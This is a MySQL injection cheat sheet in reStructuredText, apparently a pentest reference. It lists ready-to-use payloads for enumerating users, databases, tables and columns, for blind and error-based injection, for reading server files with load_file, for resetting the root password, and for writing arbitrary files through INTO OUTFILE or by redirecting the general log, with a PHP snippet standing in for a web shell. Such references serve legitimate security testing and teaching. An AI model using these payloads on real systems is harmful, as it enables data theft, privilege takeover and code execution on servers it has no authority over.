MySQL Payload
========================================

Common Payloads
----------------------------------------
- Version
- ``SELECT @@version``
- Comment
- ``SELECT 1 -- comment``
- ``SELECT 1 # comment``
- ``SELECT /*comment*/1``
- Space
- ``0x9`` ``0xa-0xd`` ``0x20`` ``0xa0``
- Current User
- ``SELECT user()``
- ``SELECT system_user()``
- ``SELECT current_role()``
- List User
- ``SELECT user FROM mysql.user``
- Current Database
- ``SELECT database()``
- List Database
- ``SELECT schema_name FROM information_schema.schemata``
- List Tables
- ``SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
- List Columns
- ``SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
- If
- ``SELECT if(1=1,'foo','bar');`` return 'foo'
- Ascii
- ``SELECT char(0x41)``
- ``SELECT ascii('A')``
- ``SELECT 0x414243`` => return ``ABC``
- Delay
- ``sleep(1)``
- ``SELECT BENCHMARK(1000000,MD5('A'))``
- Read File
- ``select @@datadir``
- ``select load_file('databasename/tablename.MYD')``
- Blind
- ``ascii(substring(str,pos,length)) & 32 = 1``
- Error Based
- ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
- ``select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))``
- Change Password
- ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``

Common functions for injecting errors
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- extractvalue
- updatexml
- GeometryCollection
- linestring
- multilinestring
- multipoint
- multipolygon
- polygon
- exp

Write a file
----------------------------------------

Prerequisites for writing files
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- root permissions
- Know the absolute path of the file
- Write permission exists for the write path
- secure_file_priv allows writing to the corresponding location
- ``select count(file_priv) from mysql.user``

Write files based on into
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. code-block:: sql

union select 1,1,1 into outfile '/tmp/demo.txt'
union select 1,1,1 into dumpfile '/tmp/demo.txt'

The difference between dumpfile and outfile is that outfile will write a new line at the end of the line and will escape the newline character. If you write a binary file, it may be destroyed by this feature.

Write files based on log
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. code-block:: sql

show variables like '%general%';
set global general_log = on;
set global general_log_file = '/path/to/file';
select '<?php var_dump("test");?>';
set global general_log_file = '/original/path';
set global general_log = off;
